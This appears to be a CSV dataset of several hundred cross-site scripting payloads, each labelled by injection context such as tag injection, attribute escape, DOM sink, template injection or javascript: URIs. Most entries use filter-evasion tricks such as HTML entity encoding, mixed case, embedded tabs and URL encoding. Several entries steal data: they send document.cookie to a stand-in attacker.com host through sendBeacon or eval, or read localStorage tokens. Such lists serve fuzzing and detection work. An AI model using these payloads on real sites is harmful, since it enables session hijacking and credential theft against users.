payload,context
<form onwebkitanimationend=prompt(%27XSS%27)>,tag_injection
onanimationiteration=prompt(document.domain),event_handler
%3Ctemplate src=x onended=prompt('XSS')%3E,tag_injection
__proto__[%22onpointermove%22]=fetch(document.cookie),dom_sink
"""%3E%3Cimg src=x onpointerover=console.log('XSS')%3E",attribute_escape
"""><img src=x onblur=prompt('XSS')>",attribute_escape
<title onclick=confirm('XSS')>,tag_injection
"\' onselect=prompt(String.fromCharCode(88,83,83))//",attribute_escape
' ><svG oNpaGehIde=alErt(loCatIon.haSh)>,attribute_escape
""" ><svg ontoggl&#101;=prompt(1)>",attribute_escape
'><Img srC=x onPagEreVeaL=cOnfIrm(doCumEnt.doMaiN)>,attribute_escape
<s&#101;l&#101;ct/ongotpoint&#101;rc&#97;ptur&#101;=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
&quOt; onDraGenTer=coNsoLe.Log(1) x=&quOt;,attribute_escape
document.body.innerHTML=%22<img src=x onerror=eval(%27XSS%27)>%22,dom_sink
j&#97;v&#97;script:void(consol&#101;.log(1)),js_uri
\%22 ontouchmove=alert(location.hash)//,attribute_escape
""" ><svg oncopy=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape
#{alert('XSS')},template_injection
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=XMLHttpR&#101;qu&#101;st(bto&#97;(docum&#101;nt.cooki&#101;))>"")",dom_sink
<obJecT	oNbeForEpaSte=coNfiRm(DocUmeNt.DomAin)>,tag_injection
\' OntOucHenD=cOnfIrm('XSS')//,attribute_escape
%27 ><svg onfullscreenchange=console.log(1)>,attribute_escape
"<meTa
OnpOinTerOveR=cOnfIrm(1)>",tag_injection
""" %3E%3Csvg onfocusout=alert(location.hash)%3E",attribute_escape
""" onk&#101;ydown=prompt('XSS') """,attribute_escape
<s&#101;t onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log('XSS') onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log('XSS')>,tag_injection
onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log/***/(1),event_handler
OnbEfoRepAstE=cOnfIrm/***/(1),event_handler
	onanimationiteration=prompt(document.domain),event_handler
"document.body.innerHTML=""%3Cimg src=x onerror=confirm(1)%3E""",dom_sink
<noscr	ipt x=y onpointerdown=prompt(document.domain)>,tag_injection
"<div x=y onwebkitfullscreenchange=prompt(String.fromCharCode(88,83,83))>",tag_injection
"' %3E%3Csvg oncanplay=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
"\"" onmousewheel=alert(document.domain)//",attribute_escape
"""><xss onend=prompt('XSS')>",tag_injection
' ><svg onpointermove=alert(document.domain)>,attribute_escape
OnkEypResS=pRomPt/***/(1),event_handler
"%3Cscript
%3Econfirm(location.hash)%3C/script%3E",script_injection
%27 ondrop=alert(%27XSS%27) %27,attribute_escape
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""f&#101;tch(bto&#97;(docum&#101;nt.cooki&#101;))""",dom_sink
<mtext x=y onmousedown=console.log(1)>,tag_injection
OngOtpOinTerCapTurE=pRomPt/**/(loCatIon.haSh),event_handler
"Obj&#101;ct.&#97;ssign(window,{""ondr&#97;g&#101;nt&#101;r"":prompt})",dom_sink
'%3E%3Cimg src=x ondrop=confirm(location.hash)%3E,attribute_escape
"<object
onmozfullscreenchange=console.log(1)>",tag_injection
#set($x='confirm(document.domain)')$x,template_injection
"""><img src=x onbegin=confirm(1)>",attribute_escape
\%27 onkeydown=alert(location.hash)//,attribute_escape
javascript:prompt(%27XSS%27),js_uri
<body	onpointermove=alert(location.hash)>,tag_injection
%27 onfullscreenchange=console.log(1) %27,attribute_escape
"location=""javascr	ipt:eval(document.cookie+'&loc='+location.href)""",dom_sink
%22><img src=x onwebkitfullscreenchange=console.log(document.domain)>,attribute_escape
 onFocUsoUt=AleRt('XSS'),event_handler
oncut=j&#97;v&#97;script:&#97;l&#101;rt(1),event_handler
onmous&#101;down=confirm&#40;'XSS'&#41;,event_handler
' onscrollsnapchange=alert('XSS') ',attribute_escape
<%= prOmpT dOcuMenT.cOokIe %>,template_injection
<di&#97;log onpl&#97;y=prompt(docum&#101;nt.dom&#97;in) onpl&#97;y=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
%3Cmath onpromptaction=prompt(1)%3E,tag_injection
"javascript:alert(String.fromCharCode(88,83,83))",js_uri
oninvalid=confirm(1),event_handler
' oNbeForEmaTch=alErt('XSS') ',attribute_escape
"s&#101;tTim&#101;out(""consol&#101;.log(loc&#97;tion.h&#97;sh)"",0)",dom_sink
' %3E%3Csvg onclick=confirm('XSS')%3E,attribute_escape
""" ><svg onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
&quOt; onEnd=coNsoLe.Log('XSS') x=&qUot;,attribute_escape
<seT oNweBkiTfuLlsCreEncHanGe=ConSolE.lOg('XSS') onWebKitFulLscReeNchAngE=cOnsOle.loG('XSS')>,tag_injection
"element.setAttribute(%22onclick%22,%22prompt(1)%22)",dom_sink
onrepeat=javascr	ipt:console.log(location.hash),event_handler
' ondrop=confirm(location.hash) ',attribute_escape
<script>window['confirm'](loc&#97;tion.h&#97;sh)</script>,script_injection
"\"" onmous&#101;ov&#101;r=confirm('XSS')//",attribute_escape
%3Cobject src=x onbeforepaste=confirm(document.domain)%3E,tag_injection
%22><img src=x onwebkittransitionend=confirm(location.hash)>,attribute_escape
"""><&#97;r&#101;&#97; onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
"SetTimEouT(""EvaL('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)"",0)",dom_sink
'><img src=x onpointermove=alert(document.domain)>,attribute_escape
 onp&#97;g&#101;show=confirm(loc&#97;tion.h&#97;sh),event_handler
%3Ctitle/onclick=confirm('XSS')%3E,tag_injection
"""><Img srC=x onFocUsoUt=ConFirM(lOcaTioN.hAsh)>",attribute_escape
\' OncAnpLay=prOmpT(dOcuMenT.dOmaIn)//,attribute_escape
<form x=y onreset=console.log(document.domain)>,tag_injection
"`><img src=x onanimationiteration=alert(String.fromCharCode(88,83,83))>",attribute_escape
oncut=\u0061lert(1),event_handler
\' onmousewheel=alert(location.hash)//,attribute_escape
"""><img src=x onmousewheel=prompt(document.domain)>",attribute_escape
%27 onpointerover=confirm(location.hash) %27,attribute_escape
"""><img src=x ons&#101;l&#101;ct=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape
%27><img src=x ondblclick=confirm(1)>,attribute_escape
""" %3E%3Csvg onload=alert(1)%3E",attribute_escape
<dialog	onended=console.log(1)>,tag_injection
"\%22 onpointerover=console.log(String.fromCharCode(88,83,83))//",attribute_escape
\' ontoggle=\u0061lert(document.domain)//,attribute_escape
<div src=x onp&#97;us&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
%3Canimatemotion/ondrop=confirm(location.hash)%3E,tag_injection
""" onpoint&#101;rov&#101;r=consol&#101;.log('XSS') """,attribute_escape
<link x=y oninput=alert(document.domain)>,tag_injection
%3CSCRIPT%3Econsole.log(1)%3C/SCRIPT%3E,script_injection
onwaiting=console.log&#40;location.hash&#41;,event_handler
<scRipT>pRomPt(1)</scRipT>,script_injection
&quOt; onMouSewHeeL=cOnsOle.loG(1) x=&qUot;,attribute_escape
""" ><svg onpoint&#101;rr&#97;wupd&#97;t&#101;=&#97;l&#101;rt('XSS')>",attribute_escape
"window[""confirm""](location.hash)",dom_sink
"&quot; onerror=confirm(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
 ondr&#97;gov&#101;r=prompt('XSS'),event_handler
' oNcoPy=ConSolE.lOg(1) ',attribute_escape
"OngEstUreEnd=jaVasCriPt:ConFirM(STriNg.FroMChArCOde(88,83,83))",event_handler
<listing onpointerrawupdate=alert('XSS')/>,tag_injection
"""><img src=x onw&#101;bkit&#97;nim&#97;tion&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape
"""><BasE oNbeForEcoPy=ConSolE.lOg(LocAtiOn.HasH)>",tag_injection
<mtExt	onEndEd=ConFirM(dOcuMenT.dOmaIn)>,tag_injection
<meTa OndRop=alErt(doCumEnt.doMaiN)>,tag_injection
<scRipT>/*/cOnfIrm(loCatIon.haSh)</sCriPt>,script_injection
onpointerrawupdate=javascript:console.log(1),event_handler
%27 onmousewheel=alert(document.domain) %27,attribute_escape
"\"" onpromptdismiss=prompt(loc&#97;tion.h&#97;sh)//",attribute_escape
"`><img src=x onvolumechange=alert(String.fromCharCode(88,83,83))>",attribute_escape
"""><img src=x onended=prompt('XSS')>",attribute_escape
&quot; on&#97;uxclick=consol&#101;.log(1) x=&quot;,attribute_escape
"__proto__[%22onrepeat%22]=console.log(navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink
"document.write(""<img src=x onerror=prompt('XSS')>"")",dom_sink
"ObjEct.asSigN(wIndOw,{""oNbeGin"":XMLHTtpReqUesT})",dom_sink
' oNenD=aLerT('XSS') ',attribute_escape
%22 ><svg oncontextmenu=alert(document.domain)>,attribute_escape
[#aLerT dOcuMenT.dOmaIn /],template_injection
`><img src=x onp&#97;g&#101;hid&#101;=confirm(1)>,attribute_escape
"<body	ong&#101;stur&#101;st&#97;rt=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<script>\u0061lert`1`</script>,script_injection
'><img src=x ontouchstart=confirm('XSS')>,attribute_escape
' ><svg onc&#97;npl&#97;y=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape
 oncontextmenu=alert('XSS'),event_handler
""" ><svg onpromptdismiss=consol&#101;.log('XSS')>",attribute_escape
""" ><svG oNplAy=ConFirM(dOcuMenT.dOmaIn)>",attribute_escape
""" oNblUr=ConSolE.lOg(DocUmeNt.DomAin) """,attribute_escape
"Object.assign(window,{%22onvolumechange%22:eval})",dom_sink
 onhashchange=confirm('XSS'),event_handler
<animate x=y onwebkitfullscreenchange=console.log(1)>,tag_injection
OnlOad=coNfiRm&#40;loCatIon.haSh&#41;,event_handler
onb&#101;for&#101;p&#97;st&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler
"__pRotO__[""oNmoUseWheEl""]=aLerT('XSS')",dom_sink
eval(%22prompt(document.cookie)%22),dom_sink
 onWheEl=ProMpt(1),event_handler
%27><img src=x onpopstate=alert(%27XSS%27)>,attribute_escape
%3Ctd x=y onwebkitanimationend=prompt('XSS')%3E,tag_injection
JavAscRipT:cOnsOle.loG/***/(doCumEnt.doMaiN),js_uri
"<!--><iframe ontouchstart=prompt(String.fromCharCode(88,83,83))>",tag_injection
onfocusin=prompt/*x*/(location.hash),event_handler
<&#97;nim&#97;t&#101;motion/ondrop=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
\' onselect=console.log(location.hash)//,attribute_escape
<!--><m&#97;rqu&#101;&#101; on&#97;uxclick=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
onpointercancel=console.log(1),event_handler
"<marquee onbeforetoggle=\u0061lert(String.fromCharCode(88,83,83)) onbeforetoggle=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection
"data:text/html,<scr	ipt>alert(document.domain)</scr	ipt>",js_uri
"""%3E%3Cimg src=x ontouchstart=console.log(1)%3E",attribute_escape
'><Img srC=x onCut=coNsoLe.Log(1)>,attribute_escape
<script ondblclick=prompt(1)>,tag_injection
"WinDow[""cOnfIrm""](1)",dom_sink
"<!--><noscript onb&#101;for&#101;m&#97;tch=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""><BasE oNgeStuReeNd=ConSolE.lOg(DocUmeNt.DomAin)>",tag_injection
%3Cform	onpagereveal=console.log(location.hash)%3E,tag_injection
'><img src=x on&#97;uxclick=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape
"""%3E%3Cimg src=x ontransitionrun=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
' ondrop=confirm(1) ',attribute_escape
'><img src=x onk&#101;ydown=&#97;l&#101;rt('XSS')>,attribute_escape
%3C!--%3E%3Cvideo onmozfullscreenchange=prompt('XSS')%3E,tag_injection
"<td
onStaLleD=cOnfIrm('XSS')>",tag_injection
&quot; onmousewheel=\u0061lert(1) x=&quot;,attribute_escape
"__proto__[""ontouchst&#97;rt""]=f&#101;tch(String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink
\' onp&#97;g&#101;hid&#101;=prompt('XSS')//,attribute_escape
OnsTalLed=coNfiRm(LocAtiOn.HasH),event_handler
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:&#101;v&#97;l('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)""",dom_sink
""" onpointermove=alert(String.fromCharCode(88,83,83)) """,attribute_escape
"LocAtiOn=""jaVasCriPt:ConSolE.lOg(1)""",dom_sink
`%3E%3Cimg src=x onreset=alert('XSS')%3E,attribute_escape
""" onended=alert(String.fromCharCode(88,83,83)) """,attribute_escape
"<tr
onanimationend=prompt('XSS')>",tag_injection
"__proto__[""onpoint&#101;rdown""]=consol&#101;.log(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink
{{$on.constructor(%27prompt(%27XSS%27)%27)()}},template_injection
 onWaiTinG=cOnfIrm(doCumEnt.doMaiN),event_handler
%3C!--%3E%3Cxmp ontransitionend=alert(location.hash)%3E,tag_injection
<svg onpromptdismiss=\u0061lert(location.hash)>,tag_injection
"JavAscRipT:aLerT(STriNg.FroMChArCOde(88,83,83))",js_uri
"<div
onwebkitfullscreenchange=prompt(String.fromCharCode(88,83,83))>",tag_injection
`><img src=x onpointerrawupdate=prompt('XSS')>,attribute_escape
__proto__[%22onerror%22]=XMLHttpRequest(document.domain),dom_sink
<xss onend=prompt(%27XSS%27)/>,tag_injection
"' onreset=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape
"__proto__[""onfocusout""]=prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink
<&#97;r&#101;&#97;/onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
<plaintext x=y ontouchstart=\u0061lert(1)>,tag_injection
"ObjEct.asSigN(wIndOw,{""oNpoPstAte"":eVal})",dom_sink
"<script
>alert(location.hash)</script>",script_injection
%3C!--%3E%3Ctd onkeyup=confirm(document.domain)%3E,tag_injection
&#106;avascript:alert('XSS'),js_uri
"""><Img srC=x onDblCliCk=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
{{&#97;l&#101;rt docum&#101;nt.dom&#97;in}},template_injection
"Obj&#101;ct.&#97;ssign(window,{""onpopst&#97;t&#101;"":consol&#101;.log})",dom_sink
"' ><svg onanimationcancel=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"location.href=""javascr	ipt:prompt(1)""",dom_sink
%3Cselect src=x onpromptdismiss=console.log(1)%3E,tag_injection
&quot; oncopy=console.log(1) x=&quot;,attribute_escape
<animatemotion/ondrop=confirm(location.hash)>,tag_injection
' onwheel=alert('XSS') ',attribute_escape
%27><img src=x onpointermove=alert(document.domain)>,attribute_escape
"document.write(""%3Cimg src=x onerror=alert(localStorage.getItem('token'))%3E"")",dom_sink
<set onfocus=prompt(document.domain)/>,tag_injection
%3Cform onwaiting=confirm(1)/%3E,tag_injection
"__proto__[""onfullscr&#101;&#101;nch&#97;ng&#101;""]=&#97;l&#101;rt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink
"""%3E%3Cset onclose=confirm(document.domain)%3E",tag_injection
""" ><svG oNfoCus=coNsoLe.Log(1)>",attribute_escape
`><img src=x onsearch=prompt(document.domain)>,attribute_escape
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""confirm('XSS')"")",dom_sink
"%27><img src=x onpointerrawupdate=confirm(String.fromCharCode(88,83,83))>",attribute_escape
	onkeypress=console.log(location.hash),event_handler
"(neW FUncTioN(""XMLHttPReQueSt('XSS')""))();",dom_sink
javascr	ipt:alert/**/(1),js_uri
"""><img src=x onchange=console.log(1)>",attribute_escape
"&#101;v&#97;l(""f&#101;tch('XSS')"")",dom_sink
"__proto__[""onw&#101;bkittr&#97;nsition&#101;nd""]=prompt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink
"%3Cscript%3EsetTimeout('console.log(String.fromCharCode(88,83,83))',0)%3C/script%3E",script_injection
<!--><dialog onstalled=confirm(%27XSS%27)>,tag_injection
"\"" onmous&#101;up=prompt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
' ><svg onbeforecut=confirm(1)>,attribute_escape
"EleMenT.sEtATtrIbuTe(""onCliCk"",""XMLHTtpReqUesT(dOcuMenT.dOmaIn)"")",dom_sink
<script x=y ondblclick=prompt(1)>,tag_injection
<ifr&#97;m&#101; x=y ons&#101;curitypolicyviol&#97;tion=confirm('XSS')>,tag_injection
"location=""javascript:\u0061lert('//attacker.com/?c='+document.cookie)""",dom_sink
"' %3E%3Csvg onpointerdown=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
\%27 onbeforepaste=confirm(document.domain)//,attribute_escape
<noscript ongesturestart=alert(%27XSS%27)/>,tag_injection
<&#97;nim&#97;t&#101;tr&#97;nsform x=y onpoint&#101;rmov&#101;=consol&#101;.log('XSS')>,tag_injection
"__proto__[""onscroll&#101;nd""]=f&#101;tch(bto&#97;(docum&#101;nt.cooki&#101;))",dom_sink
<tr src=x onfocus=confirm(%27XSS%27)>,tag_injection
OnlOad=jaVasCriPt:ConFirM(dOcuMenT.dOmaIn),event_handler
'><img src=x onmous&#101;ov&#101;r=confirm('XSS')>,attribute_escape
<m&#101;t&#97; src=x ontr&#97;nsitionst&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
<table x=y onmozfullscreenchange=confirm(1)>,tag_injection
"""><m&#101;t&#97; ontr&#97;nsitionst&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
onanimationiteration=confirm(%27XSS%27),event_handler
 onsearch=console.log('XSS'),event_handler
"\"" onplaying=\u0061lert(location.hash)//",attribute_escape
""" ><svg onp&#97;g&#101;show=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape
<!--><td onsubmit=confirm(document.domain)>,tag_injection
onfullscreenchange=console.log/**/(1),event_handler
`><img src=x ongotpoint&#101;rc&#97;ptur&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape
"__proto__[""onpointerrawupdate""]=console.log(localStorage.getItem('token'))",dom_sink
onpaste=\u0061lert(1),event_handler
"<script>s&#101;tTim&#101;out('prompt(loc&#97;tion.h&#97;sh)',0)</script>",script_injection
<!--><ScrIpt onPoiNteRraWupDatE=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""XMLHttpR&#101;qu&#101;st('XSS')""",dom_sink
	onCliCk=ProMpt('XSS'),event_handler
<viDeo onDraGstArt=alErt('XSS') oNdrAgsTarT=aLerT('XSS')>,tag_injection
OntOucHenD=jAvaScrIpt:alErt(loCatIon.haSh),event_handler
"' ongotpointercapture=confirm(String.fromCharCode(88,83,83)) '",attribute_escape
"	onDraGovEr=ProMpt(StRinG.fRomChaRCoDe(88,83,83))",event_handler
<&#97;udio onscroll&#101;nd=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection
' ><svg onanimationend=confirm(document.domain)>,attribute_escape
"setInterval(""XMLHttpRequest(document.cookie+'&loc='+location.href)"",100)",dom_sink
onbeforepaste=confirm(1),event_handler
"%3Cmeta
ondrop=alert(document.domain)%3E",tag_injection
"\"" OndRop=coNfiRm(LocAtiOn.HasH)//",attribute_escape
' %3E%3Csvg onpopstate=alert(location.hash)%3E,attribute_escape
\%22 ondblclick=console.log(%27XSS%27)//,attribute_escape
	onbeforeinput=console.log(document.domain),event_handler
"document.write(%22<img src=x onerror=confirm(navigator.sendBeacon(%27//attacker.com%27,document.cookie))>%22)",dom_sink
"'><img src=x ons&#101;l&#101;ct=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"\"" on&#97;nim&#97;tionc&#97;nc&#101;l=confirm(loc&#97;tion.h&#97;sh)//",attribute_escape
%22><img src=x onwebkitanimationend=console.log(document.domain)>,attribute_escape
'><img src=x oncanplay=confirm(location.hash)>,attribute_escape
"<taBle
onSelEct=coNfiRm(DocUmeNt.DomAin)>",tag_injection
""" ><svg onc&#97;npl&#97;y=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape
"\"" onpromptdismiss=prompt(document.domain)//",attribute_escape
%22 ><svg ondrop=confirm(document.domain)>,attribute_escape
${confirm(document.domain)},template_injection
onlo&#97;d=prompt(docum&#101;nt.dom&#97;in),event_handler
%3Csource oninput=alert(location.hash)/%3E,tag_injection
"element.setAttribute(""onclick"",""prompt(navigator.sendBeacon('//attacker.com',document.cookie))"")",dom_sink
onmouseover=confirm(document.domain),event_handler
onclick=javascr	ipt:confirm(1),event_handler
<svg x=y onpromptdismiss=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
' %3E%3Csvg onpageshow=confirm(document.domain)%3E,attribute_escape
"\%27 onmouseenter=console.log(String.fromCharCode(88,83,83))//",attribute_escape
"`><Img srC=x onKeyDowN=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
"setInterval(""confirm(navigator.sendBeacon('//attacker.com',document.cookie))"",100)",dom_sink
#{{ProMpt(1)}},template_injection
 on&#101;nd=&#97;l&#101;rt(1),event_handler
<teXtaRea/onScrOllEnd=alErt('XSS')>,tag_injection
"\' ondblclick=\u0061lert(String.fromCharCode(88,83,83))//",attribute_escape
`><img src=x onerror=console.log(document.domain)>,attribute_escape
"s&#101;tInt&#101;rv&#97;l(""consol&#101;.log(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))"",100)",dom_sink
%3Cscript onkeydown=confirm(document.domain)%3E,tag_injection
"%27 onhashchange=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape
""" onfocusout=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) """,attribute_escape
\' onfocus=console.log(location.hash)//,attribute_escape
' ><svg onpaste=console.log(document.domain)>,attribute_escape
